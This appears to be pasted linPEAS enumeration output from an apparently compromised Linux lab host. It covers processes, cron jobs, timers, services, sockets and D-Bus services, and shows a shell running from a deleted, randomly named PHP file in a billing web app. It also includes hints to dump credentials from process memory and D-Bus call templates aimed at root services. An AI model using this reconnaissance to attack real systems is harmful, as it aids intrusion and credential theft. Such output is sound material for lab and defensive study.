rtkit       1487  0.0  0.0  22704  1564 ?        SNsl 20:37   0:00 /usr/libexec/rtkit-daemon
  \u2514\u2500(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
Debian-+    1535  0.0  0.4 311456  9588 tty1     Sl+  20:37   0:00 /usr/libexec/at-spi-bus-launcher
Debian-+    1540  0.0  0.2   9128  4364 tty1     S+   20:37   0:00  _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/116/at-spi/bus_0
Debian-+    1602  0.0  0.4 236704  8812 tty1     Sl+  20:37   0:00 /usr/libexec/xdg-permission-store
root        1610  0.0  0.4 233720  8700 ?        Ssl  20:37   0:00 /usr/libexec/upowerd
Debian-+    1627  0.0  1.3 2518300 27632 tty1    Sl+  20:37   0:00 /usr/bin/gjs /usr/share/gnome-shell/org.gnome.Shell.Notifications
Debian-+    1639  0.0  0.5 164396 10200 tty1     Sl+  20:37   0:00 /usr/libexec/at-spi2-registryd --use-gnome-session
colord      1640  0.0  0.7 242364 14288 ?        Ssl  20:37   0:00 /usr/libexec/colord
Debian-+    1732  0.0  0.8 341912 16664 tty1     Sl+  20:37   0:00 /usr/libexec/gsd-printer
Debian-+    1795  0.0  0.9 186952 18896 tty1     Sl   20:37   0:00 /usr/libexec/ibus-x11 --kill-daemon
Debian-+    1803  0.0  1.4 2518300 27860 tty1    Sl+  20:37   0:00 /usr/bin/gjs /usr/share/gnome-shell/org.gnome.ScreenSaver
Debian-+    1815  0.0  0.3 234168  7356 tty1     Sl+  20:37   0:00 /usr/libexec/ibus-portal

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes with unusual configurations
Process 864 (root) - /usr/sbin/cupsd -l 
SELinux context: /usr/sbin/cupsd (enforce)
  \u2514\u2500 AppArmor profile: /usr/sbin/cupsd (enforce)

Process 943 (root) - /usr/sbin/cups-browsed 
SELinux context: /usr/sbin/cups-browsed (enforce)
  \u2514\u2500 AppArmor profile: /usr/sbin/cups-browsed (enforce)

Process 1179 (ntpsec) - /usr/sbin/ntpd -p /run/ntpd.pid -c /etc/ntpsec/ntp.conf -g -N -u ntpsec:ntpsec 
SELinux context: /usr/sbin/ntpd (enforce)
  \u2514\u2500 AppArmor profile: /usr/sbin/ntpd (enforce)


\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes with credentials in memory (root req)
\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)
mysql process found (dump creds from memory as root)
postgres Not Found
redis-server Not Found
mongod Not Found
memcached Not Found
elasticsearch Not Found
jenkins Not Found
tomcat Not Found
nginx Not Found
php-fpm process found (dump creds from memory as root)
supervisord Not Found
vncserver Not Found
xrdp Not Found
teamviewer Not Found

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Opened Files by processes
Process 3354 (asterisk) - sh -c /bin/sh  
  \u2514\u2500 Has open files:
    \u2514\u2500 pipe:[74843]
    \u2514\u2500 pipe:[74844]
    \u2514\u2500 /var/www/html/mbilling/lib/icepay/eejegmAlEsyyzgVz.php (deleted)
    \u2514\u2500 pipe:[74845]
Process 3355 (asterisk) - /bin/sh 
  \u2514\u2500 Has open files:
    \u2514\u2500 pipe:[74843]
    \u2514\u2500 pipe:[74844]
    \u2514\u2500 /var/www/html/mbilling/lib/icepay/eejegmAlEsyyzgVz.php (deleted)
    \u2514\u2500 pipe:[74845]
Process 33275 (asterisk) - tee /tmp/linpeas.out 
  \u2514\u2500 Has open files:
    \u2514\u2500 pipe:[189739]
    \u2514\u2500 pipe:[74844]
    \u2514\u2500 /var/www/html/mbilling/lib/icepay/eejegmAlEsyyzgVz.php (deleted)
    \u2514\u2500 pipe:[74845]
    \u2514\u2500 /tmp/linpeas.out

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes with memory-mapped credential files

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Processes whose PPID belongs to a different user (not root)
\u255a You will know if a user can somehow spawn processes as a different user

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Files opened by processes belonging to other users
\u255a This is usually empty because of the lack of privileges to read other user processes information

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Check for vulnerable cron jobs
\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
\u2550\u2550\u2563 Cron jobs list
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root       9 Sep  9  2024 /etc/cron.deny
-rw-r--r-- 1 root root    1040 Sep  9  2024 /etc/crontab
-rw-r--r-- 1 root root    1042 Mar  1  2023 /etc/crontab.dpkg-dist

/etc/cron.d:
total 36
drwxr-xr-x   2 root root  4096 May 28 13:02 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rw-r--r--   1 root root   285 Feb  6  2021 anacron
-rw-r--r--   1 root root   201 Jun  7  2021 e2scrub_all
-rw-r--r--   1 root root   140 Jan 16  2023 ntpsec
-rw-r--r--   1 root root   712 May 11  2020 php

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root  4096 May 28 12:58 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rwxr-xr-x   1 root root   311 Feb  6  2021 0anacron
-rwxr-xr-x   1 root root   539 Jun  8  2022 apache2
-rwxr-xr-x   1 root root  1478 May 25  2023 apt-compat
-rwxr-xr-x   1 root root   314 Dec 21  2020 aptitude
-rwxr-xr-x   1 root root   123 Mar 26  2023 dpkg
-rwxr-xr-x   1 root root   377 Jan 30  2022 logrotate
-rwxr-xr-x   1 root root  1395 Mar 12  2023 man-db
-rwxr-xr-x   1 root root  1403 Sep 23  2020 ntp

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 May 28 12:51 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 May 28 12:55 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rwxr-xr-x   1 root root   313 Feb  6  2021 0anacron

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 May 28 12:56 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Feb 22  2021 .placeholder
-rwxr-xr-x   1 root root   312 Feb  6  2021 0anacron
-rwxr-xr-x   1 root root  1055 Mar 12  2023 man-db

/etc/cron.yearly:
total 20
drwxr-xr-x   2 root root  4096 May 28 12:51 .
drwxr-xr-x 146 root root 12288 Oct 10 20:37 ..
-rw-r--r--   1 root root   102 Mar  1  2023 .placeholder

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Mar 27  2024 .
drwxr-xr-x 8 root root 4096 Mar 27  2024 ..
-rw------- 1 root root    9 Oct 10 20:41 cron.daily
-rw------- 1 root root    9 Oct 10 20:51 cron.monthly
-rw------- 1 root root    9 Oct 10 20:46 cron.weekly
asterisk

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly

\u2550\u2550\u2563 Checking for specific cron jobs vulnerabilities
Checking cron directories...

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 System timers
\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
\u2550\u2550\u2563 Active timers:
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES
Fri 2025-10-10 22:09:00 HDT 27min left    Fri 2025-10-10 21:39:01 HDT 1min 58s ago         phpsessionclean.timer        phpsessionclean.service
Fri 2025-10-10 22:31:56 HDT 50min left    Fri 2025-10-10 21:31:35 HDT 9min ago             anacron.timer                anacron.service
Fri 2025-10-10 23:23:05 HDT 1h 42min left Wed 2025-05-28 12:38:07 HDT 4 months 13 days ago apt-daily.timer              apt-daily.service
Sat 2025-10-11 00:00:00 HDT 2h 18min left -                           -                    dpkg-db-backup.timer         dpkg-db-backup.service
Sat 2025-10-11 00:00:00 HDT 2h 18min left Fri 2025-10-10 20:36:59 HDT 1h 4min ago          logrotate.timer              logrotate.service
Sat 2025-10-11 06:06:21 HDT 8h left       Fri 2025-10-10 21:20:05 HDT 20min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2025-10-11 06:25:00 HDT 8h left       Fri 2025-10-10 20:36:59 HDT 1h 4min ago          ntpsec-rotate-stats.timer    ntpsec-rotate-stats.service
Sat 2025-10-11 06:30:40 HDT 8h left       Wed 2025-05-28 12:36:01 HDT 4 months 13 days ago fwupd-refresh.timer          fwupd-refresh.service
Sat 2025-10-11 11:52:18 HDT 14h left      Fri 2025-10-10 21:12:55 HDT 28min ago            man-db.timer                 man-db.service
Sat 2025-10-11 20:49:55 HDT 23h left      Fri 2025-10-10 20:49:55 HDT 51min ago            systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-10-12 03:10:04 HDT 1 day 5h left Fri 2025-10-10 20:36:59 HDT 1h 4min ago          e2scrub_all.timer            e2scrub_all.service
Mon 2025-10-13 01:14:27 HDT 2 days left   Fri 2025-10-10 20:49:45 HDT 51min ago            fstrim.timer                 fstrim.service
\u2550\u2550\u2563 Disabled timers:
\u2550\u2550\u2563 Additional timer files:
Potential privilege escalation in timer file: /etc/systemd/system/ntpsec.timer
  \u2514\u2500 WRITABLE_FILE: Timer target file is writable: /dev/null

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Services and Service Files
\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services

\u2550\u2550\u2563 Active services:
accounts-daemon.service             loaded active running Accounts Service
amazon-ssm-agent.service            loaded active running amazon-ssm-agent
apache2.service                     loaded active running The Apache HTTP Server
apparmor.service                    loaded active exited  Load AppArmor profiles
asterisk.service                    loaded active running LSB: Asterisk PBX
avahi-daemon.service                loaded active running Avahi mDNS/DNS-SD Stack
badr.service                        loaded active running Badr Service
root@ip-10-201-85-122:~# 

  633	plymouth-read-write.service         loaded active exited  Tell Plymouth To Write Out Runtime Data
   634	plymouth-start.service              loaded active exited  Show Plymouth Boot Screen
   635	polkit.service                      loaded active running Authorization Manager
   636	power-profiles-daemon.service       loaded active running Power Profiles daemon
   637	pulseaudio-enable-autospawn.service loaded active exited  LSB: Enable pulseaudio autospawn
   638	rc-local.service                    loaded active exited  /etc/rc.local Compatibility
   639	rsyslog.service                     loaded active running System Logging Service
   640	rtkit-daemon.service                loaded active running RealtimeKit Scheduling Policy Service
   641	ssh.service                         loaded active running OpenBSD Secure Shell server
   642	switcheroo-control.service          loaded active running Switcheroo Control Proxy service
   643	systemd-binfmt.service              loaded active exited  Set Up Additional Binary Formats
   644	systemd-journal-flush.service       loaded active exited  Flush Journal to Persistent Storage
   645	  Potential issue in service file: /lib/systemd/system/systemd-journal-flush.service
   646	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   647	systemd-journald.service            loaded active running Journal Service
   648	systemd-logind.service              loaded active running User Login Management
   649	systemd-modules-load.service        loaded active exited  Load Kernel Modules
   650	systemd-random-seed.service         loaded active exited  Load/Save Random Seed
   651	systemd-remount-fs.service          loaded active exited  Remount Root and Kernel File Systems
   652	  Potential issue in service: systemd-remount-fs.service
   653	  \u2514\u2500 UNSAFE_CMD: Uses potentially dangerous commands
   654	systemd-sysctl.service              loaded active exited  Apply Kernel Variables
   655	systemd-sysusers.service            loaded active exited  Create System Users
   656	  Potential issue in service file: /lib/systemd/system/systemd-sysusers.service
   657	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   658	  Potential issue in service: systemd-sysusers.service
   659	  \u2514\u2500 UNSAFE_CMD: Uses potentially dangerous commands
   660	systemd-tmpfiles-setup-dev.service  loaded active exited  Create Static Device Nodes in /dev
   661	systemd-tmpfiles-setup.service      loaded active exited  Create System Files and Directories
   662	systemd-udev-trigger.service        loaded active exited  Coldplug All udev Devices
   663	  Potential issue in service file: /lib/systemd/system/systemd-udev-trigger.service
   664	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   665	  Potential issue in service: systemd-udev-trigger.service
   666	  \u2514\u2500 UNSAFE_CMD: Uses potentially dangerous commands
   667	systemd-udevd.service               loaded active running Rule-based Manager for Device Events and Files
   668	  Potential issue in service file: /lib/systemd/system/systemd-udevd.service
   669	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   670	systemd-update-utmp.service         loaded active exited  Record System Boot/Shutdown in UTMP
   671	systemd-user-sessions.service       loaded active exited  Permit User Sessions
   672	udisks2.service                     loaded active running Disk Manager
   673	ufw.service                         loaded active exited  Uncomplicated firewall
   674	unattended-upgrades.service         loaded active running Unattended Upgrades Shutdown
   675	upower.service                      loaded active running Daemon for power management
   676	user-runtime-dir@116.service        loaded active exited  User Runtime Directory /run/user/116
   677	user@116.service                    loaded active running User Manager for UID 116
   678	wpa_supplicant.service              loaded active running WPA supplicant
   679	  Potential issue in service: wpa_supplicant.service
   680	  \u2514\u2500 UNSAFE_CMD: Uses potentially dangerous commands
   681	LOAD   = Reflects whether the unit definition was properly loaded.
   682	ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
   683	SUB    = The low-level unit activation state, values depend on unit type.
   684	63 loaded units listed.
   685	
   686	\u2550\u2550\u2563 Disabled services:
   687	apache-htcacheclean.service            disabled enabled
   688	apache-htcacheclean@.service           disabled enabled
   689	apache2@.service                       disabled enabled
   690	console-getty.service                  disabled disabled
   691	debug-shell.service                    disabled disabled
   692	ifupdown-wait-online.service           disabled enabled
   693	mariadb@.service                       disabled enabled
   694	nftables.service                       disabled enabled
   695	ntpsec-wait.service                    disabled enabled
   696	rtkit-daemon.service                   disabled enabled
   697	serial-getty@.service                  disabled enabled
   698	speech-dispatcherd.service             disabled enabled
   699	systemd-boot-check-no-failures.service disabled disabled
   700	systemd-network-generator.service      disabled enabled
   701	systemd-networkd-wait-online.service   disabled disabled
   702	systemd-networkd-wait-online@.service  disabled enabled
   703	systemd-networkd.service               disabled enabled
   704	  Potential issue in service file: /lib/systemd/system/systemd-networkd.service
   705	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   706	systemd-sysext.service                 disabled enabled
   707	  Potential issue in service file: /lib/systemd/system/systemd-sysext.service
   708	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   709	systemd-time-wait-sync.service         disabled disabled
   710	upower.service                         disabled enabled
   711	wpa_supplicant-nl80211@.service        disabled enabled
   712	wpa_supplicant-wired@.service          disabled enabled
   713	wpa_supplicant@.service                disabled enabled
   714	23 unit files listed.
   715	
   716	\u2550\u2550\u2563 Additional service files:
   717	  Potential issue in service file: /etc/systemd/system/badr.service
   718	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   719	  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/badr.service
   720	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   721	  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/mariadb.service
   722	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   723	  Potential issue in service file: /etc/systemd/system/multi-user.target.wants/networking.service
   724	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   725	  Potential issue in service file: /etc/systemd/system/network-online.target.wants/networking.service
   726	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   727	  Potential issue in service file: /etc/systemd/user/gnome-session.target.wants/org.freedesktop.IBus.session.GNOME.service
   728	  \u2514\u2500 RELATIVE_PATH: Could be executing some relative path
   729	You can't write on systemd PATH
   730	
   731	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Systemd Information
   732	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
   733	\u2550\u2563 Systemd version and vulnerabilities? .............. 252.36
   734	\u2550\u2563 Services running as root? ..... 
   735	\u2550\u2563 Running services with dangerous capabilities? ... 
   736	\u2550\u2563 Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)
   737	badr.service: Uses relative path '+x' (from ExecStartPre=/bin/chmod +x /etc/badr/badr)
   738	fail2ban.service: Uses relative path 'ExecStart=/usr/bin/fail2ban-server' (from # ExecStart=/usr/bin/fail2ban-server -xf --logtarget=sysout start)
   739	mariadb.service: Uses relative path 'ExecStartPre=/usr/bin/mysql_install_db' (from # ExecStartPre=/usr/bin/mysql_install_db -u mysql)
   740	mariadb.service: Uses relative path '$MYSQLD_OPTS' (from ExecStart=/usr/sbin/mariadbd $MYSQLD_OPTS $_WSREP_NEW_CLUSTER $_WSREP_START_POSITION)
   741	mariadb.service: Uses relative path 'ExecStartPre=sync' (from # ExecStartPre=sync)
   742	mariadb.service: Uses relative path 'ExecStartPre=sysctl' (from # ExecStartPre=sysctl -q -w vm.drop_caches=3)
   743	mariadb.service: Uses relative path 'Change' (from # Change ExecStart=numactl --interleave=all /usr/sbin/mariadbd......)
   744	php8.2-fpm.service: Uses relative path 'install' (from ExecStartPost=-/usr/lib/php/php-fpm-socket-helper install /run/php/php-fpm.sock /etc/php/8.2/fpm/pool.d/www.conf 82)
   745	rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)
   746	
   747	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Systemd PATH
   748	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths
   749	PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
   750	
   751	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing .socket files
   752	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
   753	
   754	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Unix Sockets Analysis
   755	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets
   756	/run/asterisk/asterisk.ctl
   757	  \u2514\u2500(Read Execute )
   758	  \u2514\u2500(Owned by root)
   759	/run/avahi-daemon/socket
   760	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   761	  \u2514\u2500(Owned by root)
   762	/run/cups/cups.sock
   763	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   764	  \u2514\u2500(Owned by root)
   765	/run/dbus/system_bus_socket
   766	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   767	  \u2514\u2500(Owned by root)
   768	/run/fail2ban/fail2ban.sock
   769	/run/mysqld/mysqld.sock
   770	  \u2514\u2500(Read Write Execute (Weak Permissions: 777) )
   771	/run/php/php8.2-fpm.sock
   772	/run/systemd/fsck.progress
   773	/run/systemd/inaccessible/sock
   774	/run/systemd/io.system.ManagedOOM
   775	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   776	  \u2514\u2500(Owned by root)
   777	/run/systemd/journal/dev-log
   778	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   779	  \u2514\u2500(Owned by root)
   780	/run/systemd/journal/io.systemd.journal
   781	/run/systemd/journal/socket
   782	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   783	  \u2514\u2500(Owned by root)
   784	/run/systemd/journal/stdout
   785	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   786	  \u2514\u2500(Owned by root)
   787	/run/systemd/journal/syslog
   788	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   789	  \u2514\u2500(Owned by root)
   790	/run/systemd/notify
   791	  \u2514\u2500(Read Write Execute (Weak Permissions: 777) )
   792	  \u2514\u2500(Owned by root)
   793	/run/systemd/private
   794	/run/systemd/userdb/io.systemd.DynamicUser
   795	  \u2514\u2500(Read Write (Weak Permissions: 666) )
   796	  \u2514\u2500(Owned by root)
   797	/run/udev/control
   798	/var/run/asterisk/asterisk.ctl
   799	  \u2514\u2500(Read Execute )
   800	  \u2514\u2500(Owned by root)
   801	/var/run/fail2ban/fail2ban.sock
   802	/var/run/mysqld/mysqld.sock
   803	  \u2514\u2500(Read Write Execute (Weak Permissions: 777) )
   804	
   805	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 D-Bus Analysis
   806	\u255a https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus
   807	NAME                                  PID PROCESS         USER       CONNECTION    UNIT                          SESSION DESCRIPTION
   808	:1.0                                  735 avahi-daemon    avahi      :1.0          avahi-daemon.service          -       -
   809	:1.1                                  739 low-memory-moni root       :1.1          low-memory-monitor.service    -       -
   810	:1.10                                 819 ModemManager    root       :1.10         ModemManager.service          -       -
   811	:1.11                                 805 NetworkManager  root       :1.11         NetworkManager.service        -       -
   812	:1.1309                             61934 busctl          asterisk   :1.1309       apache2.service               -       -
   813	:1.14                                 864 cupsd           root       :1.14         cups.service                  -       -
   814	:1.17                                 943 cups-browsed    root       :1.17         cups-browsed.service          -       -
   815	:1.18                                 943 cups-browsed    root       :1.18         cups-browsed.service          -       -
   816	:1.19                                1072 gdm3            root       :1.19         gdm.service                   -       -
   817	:1.2                                  749 systemd-logind  root       :1.2          systemd-logind.service        -       -
   818	:1.20                                 871 unattended-upgr root       :1.20         unattended-upgrades.service   -       -
   819	:1.21                                1241 apache2         asterisk   :1.21         apache2.service               -       -
   820	:1.24                                1435 systemd         Debian-gdm :1.24         user@116.service              -       -
   821	:1.25                                1459 Xorg            root       :1.25         session-c1.scope              c1      -
   822	:1.26                                1452 pipewire        Debian-gdm :1.26         user@116.service              -       -
   823	:1.27                                1454 wireplumber     Debian-gdm :1.27         user@116.service              -       -
   824	:1.28                                1455 pipewire-pulse  Debian-gdm :1.28         user@116.service              -       -
   825	:1.29                                1487 rtkit-daemon    root       :1.29         rtkit-daemon.service          -       -
   826	:1.3                                  741 polkitd         polkitd    :1.3          polkit.service                -       -
   827	:1.30                                1457 gdm-x-session   Debian-gdm :1.30         session-c1.scope              c1      -
   828	:1.31                                1500 gnome-session-b Debian-gdm :1.31         session-c1.scope              c1      -
   829	:1.32                                1454 wireplumber     Debian-gdm :1.32         user@116.service              -       -
   830	:1.33                                1557 gnome-shell     Debian-gdm :1.33         session-c1.scope              c1      -
   831	:1.34                                1585 gvfs-udisks2-vo Debian-gdm :1.34         user@116.service              -       -
   832	:1.36                                1610 upowerd         root       :1.36         upower.service                -       -
   833	:1.4                                  742 power-profiles- root       :1.4          power-profiles-daemon[0m.service -       -
   834	:1.40                                1640 colord          colord     :1.40         colord.service                -       -
   835	:1.42                                1648 gsd-sharing     Debian-gdm :1.42         session-c1.scope              c1      -
   836	:1.43                                1668 gsd-rfkill      Debian-gdm :1.43         session-c1.scope              c1      -
   837	:1.45                                1667 gsd-print-notif Debian-gdm :1.45         session-c1.scope              c1      -
   838	:1.46                                1661 gsd-keyboard    Debian-gdm :1.46         session-c1.scope              c1      -
   839	:1.47                                1732 gsd-printer     Debian-gdm :1.47         session-c1.scope              c1      -
   840	:1.48                                1673 gsd-media-keys  Debian-gdm :1.48         session-c1.scope              c1      -
   841	:1.49                                1691 gsd-power       Debian-gdm :1.49         session-c1.scope              c1      -
   842	:1.5                                    1 systemd         root       :1.5          init.scope                    -       -
   843	:1.51                                1594 goa-daemon[0m      Debian-gdm :1.51         user@116.service              -       -
   844	:1.53                                1565 tracker-miner-f Debian-gdm :1.53         user@116.service              -       -
   845	:1.6                                  733 accounts-daemon[0m root       :1.6          accounts-daemon.service       -       -
   846	:1.7                                  750 udisksd         root       :1.7          udisks2.service               -       -
   847	:1.8                                  745 switcheroo-cont root       :1.8          switcheroo-control.service    -       -
   848	:1.9                                  809 wpa_supplicant  root       :1.9          wpa_supplicant.service        -       -
   849	com.ubuntu.SoftwareProperties           - -               -          (activatable) -                             -       -
   850	fi.w1.wpa_supplicant1                 809 wpa_supplicant  root       :1.9          wpa_supplicant.service        -       -
   851	net.hadess.PowerProfiles              742 power-profiles- root       :1.4          power-profiles-daemon[0m.service -       -
   852	  \u2514\u2500(Running as root)
   853	  \u2514\u2500 Interfaces:
   854	     `-/net
   855	       `-/net/hadess
   856	         `-/net/hadess/PowerProfiles
   857	  \u2514\u2500(Potential privilege escalation vector)
   858	     \u2514\u2500 Try: busctl call net.hadess.PowerProfiles / [Interface] [Method] [Arguments]
   859	     \u2514\u2500 Or: dbus-send --session --dest=net.hadess.PowerProfiles / [Interface] [Method] [Arguments]
   860	net.hadess.SwitcherooControl          745 switcheroo-cont root       :1.8          switcheroo-control.service    -       -
   861	org.bluez                               - -               -          (activatable) -                             -       -
   862	org.freedesktop.Accounts              733 accounts-daemon[0m root       :1.6          accounts-daemon.service       -       -
   863	org.freedesktop.Avahi                 735 avahi-daemon    avahi      :1.0          avahi-daemon.service          -       -
   864	org.freedesktop.ColorManager         1640 colord          colord     :1.40         colord.service                -       -
   865	org.freedesktop.DBus                    1 systemd         root       -             init.scope                    -       -
   866	org.freedesktop.GeoClue2                - -               -          (activatable) -                             -       -
   867	org.freedesktop.LowMemoryMonitor      739 low-memory-moni root       :1.1          low-memory-monitor.service    -       -
   868	  \u2514\u2500(Running as root)
   869	  \u2514\u2500 Interfaces:
   870	     `-/org
   871	       `-/org/freedesktop
   872	         `-/org/freedesktop/LowMemoryMonitor
   873	  \u2514\u2500(Potential privilege escalation vector)
   874	     \u2514\u2500 Try: busctl call org.freedesktop.LowMemoryMonitor / [Interface] [Method] [Arguments]
   875	     \u2514\u2500 Or: dbus-send --session --dest=org.freedesktop.LowMemoryMonitor / [Interface] [Method] [Arguments]
   876	org.freedesktop.ModemManager1         819 ModemManager    root       :1.10         ModemManager.service          -       -
   877	org.freedesktop.NetworkManager        805 NetworkManager  root       :1.11         NetworkManager.service        -       -
   878	org.freedesktop.PackageKit              - -               -          (activatable) -                             -       -
   879	org.freedesktop.PolicyKit1            741 polkitd         polkitd    :1.3          polkit.service                -       -
   880	org.freedesktop.RealtimeKit1         1487 rtkit-daemon    root       :1.29         rtkit-daemon.service          -       -
   881	org.freedesktop.UDisks2               750 udisksd         root       :1.7          udisks2.service               -       -
   882	org.freedesktop.UPower               1610 upowerd         root       :1.36         upower.service                -       -
   883	org.freedesktop.bolt                    - -               -          (activatable) -                             -       -
   884	org.freedesktop.fwupd                   - -               -          (activatable) -                             -       -
   885	org.freedesktop.hostname1               - -               -          (activatable) -                             -       -
   886	org.freedesktop.locale1                 - -               -          (activatable) -                             -       -
   887	org.freedesktop.login1                749 systemd-logind  root       :1.2          systemd-logind.service        -       -
   888	org.freedesktop.network1                - -               -          (activatable) -                             -       -
   889	org.freedesktop.nm_dispatcher           - -               -          (activatable) -                             -       -
   890	org.freedesktop.nm_priv_helper          - -               -          (activatable) -                             -       -
   891	org.freedesktop.realmd                  - -               -          (activatable) -                             -       -
   892	org.freedesktop.systemd1                1 systemd         root       :1.5          init.scope                    -       -
   893	org.freedesktop.timedate1               - -               -          (activatable) -                             -       -
   894	org.gnome.DisplayManager             1072 gdm3            root       :1.19         gdm.service                   -       -
   895	org.opensuse.CupsPkHelper.Mechanism     - -               -          (activatable) -                             -       -
   896	
   897	\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 D-Bus Configuration Files
   898	Analyzing /etc/dbus-1/system.d/bluetooth.conf:
   899	  \u2514\u2500(Weak group policy found)
   900	     \u2514\u2500   <policy group="bluetooth">
   901	  \u2514\u2500(Allow rules in default context)
   902	             \u2514\u2500     <allow send_destination="org.bluez"/>
   903	Analyzing /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf:
   904	  \u2514\u2500(Allow rules in default context)
   905	             \u2514\u2500 		<allow own="com.redhat.NewPrinterNotification"/>
   906	        		<allow send_destination="com.redhat.NewPrinterNotification"
   907	Analyzing /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf:
